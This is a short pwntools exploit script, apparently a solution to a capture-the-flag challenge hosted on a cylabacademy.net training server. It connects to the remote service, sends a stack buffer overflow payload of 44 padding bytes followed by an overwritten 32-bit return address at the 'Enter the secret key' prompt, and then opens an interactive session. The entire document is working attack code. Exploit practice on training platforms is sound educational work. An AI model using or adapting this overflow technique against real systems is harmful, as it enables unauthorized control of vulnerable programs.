from pwn import *

p = remote('chatelaine.cylabacademy.net', 18343)
payload = b"A" * 44 + p32(0x080491d6)
p.sendlineafter(b'Enter the secret key: ', payload)
p.interactive()